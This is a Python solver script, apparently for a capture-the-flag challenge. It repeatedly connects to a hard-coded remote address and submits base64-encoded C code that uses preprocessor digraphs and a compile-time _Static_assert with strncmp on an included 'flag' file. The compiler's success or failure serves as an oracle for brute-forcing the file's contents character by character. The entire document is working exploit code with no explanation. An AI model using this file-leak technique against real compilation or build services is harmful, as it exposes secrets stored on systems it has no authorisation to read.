#!/usr/bin/python3
import base64
import string
from socket import socket
from binascii import hexlify

char_list = '}_0123456789aeiouystbcdfghjklmnpqrvwxzAEIOUYSTBCDFGHJKLMNPQRVWXZ'
for c in string.printable:
    if c not in char_list:
        char_list += c

flag = "{"

def recode_payload(flag):
    payload = '''
    %>
    %:define str(x) %:x
    %:define hxp str(
    %:include <string.h>
    void zika()<%
    _Static_assert(strncmp(
      %:include "flag"
    ),"#", $) == 0,"lol");
    '''
    payload = payload.replace("#", ''.join('\\x%02X'%b for b in flag.encode('ascii')))
    payload = payload.replace("$", str(len(flag)))
    return payload

payload = recode_payload(flag)

while "}" not in flag:
    found = False
    for c in char_list:
        sock = socket()
        sock.connect(('88.198.154.157', 8011))
        sock.recv(1024)
        print("flag ", flag, " trying", c)
        payload = recode_payload(flag+c)
        encodedBytes = base64.b64encode(payload.encode("utf-8"))
        encodedStr = str(encodedBytes, "utf-8")
        print(payload)
        sock.send(encodedStr.encode('utf-8') + b"\n")
        result = sock.recv(1024)
        sock.close()
        print('result', result)
        if b'Not' not in result:
            flag += c
            print(flag,"\t" ,result)
            print(payload)
            found = True
            break
    assert found
